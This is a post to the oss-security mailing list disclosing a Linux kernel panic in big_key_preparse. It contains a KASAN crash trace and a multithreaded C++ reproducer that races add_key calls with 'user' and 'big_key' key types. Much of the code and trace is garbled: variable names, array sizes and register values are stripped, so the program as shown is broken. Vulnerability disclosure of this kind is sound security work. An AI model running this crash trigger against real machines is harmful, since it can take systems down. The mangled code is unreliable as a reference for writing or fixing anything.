  oss-security - panic at big_key_preparse & master            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Fri, 22 Jul From: <zer0mem@...oo.com> To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com> Cc: "cve-assign@...re.org" <cve-assign@...re.org>,  	Marco Grassi <marco.gra@...il.com> Subject: panic at big_key_preparse & master  Hi,  Following code will panic & master  However will not panic at latest stable kernel apparently   qemu + kasan  “””  /*  author : @zer0mem  Qilin : v3.2 [ linux ] Reproducer : v1.0  KASAN : active KTSAN : non-active  Linux Kernel version : 4.7  compile : clang++-3.8 -std=c++1y poc.cpp -lpthread -o big_key_poc  issue : add_key -> "big_key"  kasan: CONFIG_KASAN_INLINE enabled kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: [#1] SMP KASAN Modules linked in: CPU: 0 PID: Comm: a.out Tainted: G    B           #9 Hardware name: QEMU Standard PC + PIIX, BIOS task: ti: task.ti: RIP:  RSP:  EFLAGS: RAX: RBX: RCX: RDX: RSI: RDI: RBP: R08: R09: R10: R11: R12: R13: R14: R15: FS:  CS:  DS: ES: CR0: CR2: CR3: CR4: DR0: DR1: DR2: DR3: DR6: DR7: Stack:   ffffffffffffffec  Call Trace:  ?   ?  ?  ?   ?  ?  Code: 5c 41 5d 41 5e 41 5f 5d c3 e8 89 f1 98 ff 4c 8b 25 32 cb 47 02 48 b8 00 00 00 00 00 fc ff df 49 8d 7c 24 48 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 78 03 00 00 4d 8b 64 24 48 48 b8 00 00 00 00  RIP   RSP ---[ end trace ]--- Kernel panic - not syncing: Fatal exception Kernel Offset: disabled ---[ end Kernel panic - not syncing: Fatal exception  */  #include <stdint.h>  #include <memory> #include <algorithm> #include <functional> #include <string> #include <atomic> #include <stdlib.h> #include <vector> #include <stdlib.h> #include <stdio.h>  #include <thread>  #include <sys/types.h> #include <sys/wait.h> #include <unistd.h> #include <pthread.h> #include <sched.h> #include <signal.h> #include <fcntl.h>  #include <keyutils.h>  int = { 0 }; char = { 0 };  bool rand01() { return std::rand() % 2; }  void shaka() { 	for (size_t i = 0; i < sizeof(buffer); ++i) 		buffer[i] = std::rand() % 0xFF;  	while (true) 	{ 		for (size_t i = std::rand() % sizeof(buffer); i < sizeof(buffer); ++i) 			buffer[i] = std::rand() % 0xFF;  		sleep(std::rand() % 10); 	} }  void workers(int fd) { 	size_t max_round = 40 + std::rand() % 	for (size_t i = 0; i < max_round; i++) 	{ 		switch(std::rand() % 1) 		{ 			case 0 : 			{ 				add_key( 					rand01() ? "user" : "big_key", 					0, 					buffer, 					std::rand() % sizeof(buffer), 					handles[std::rand() %  			} break;  			default: 				break; 		}		 	} }  void ctors(int ind) { 	handles[ind] = 0; 	while (!handles[ind]) 	{ 		switch(std::rand() % 1) 		{ 			case 0 : 			{ 				handles[ind] = add_key( 					rand01() ? "user" : "big_key", 					0, 					buffer, 					std::rand() % sizeof(buffer), 					handles[std::rand() % 			} break;  			default: 				break; 		} 	} 	int fd = handles[ind]; 	for (size_t i = 0; i < 20; ++i, sleep(1 + std::rand() % 4)) 		for (size_t j = std::rand() % 4; j; --j) 			workers(fd); }  int main() { 	std::thread(shaka).detach(); 	for (;; sleep(std::rand() % 4)) 		std::thread([]() 			{ 			for (size_t i = 0; i < ++i) 				std::thread(ctors, i).detach();		 			}).detach(); 	 	return 0; };  #include <asm/unistd.h>  #define __weak __attribute__((weak))  key_serial_t __weak add_key(const char *type, 			    const char *description, 			    const void *payload, 			    size_t plen, 			    key_serial_t ringid) { 	return syscall(__NR_add_key, 		       type, description, payload, plen, ringid); }   “””  Peter  Sent from Mail for Windows 10    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      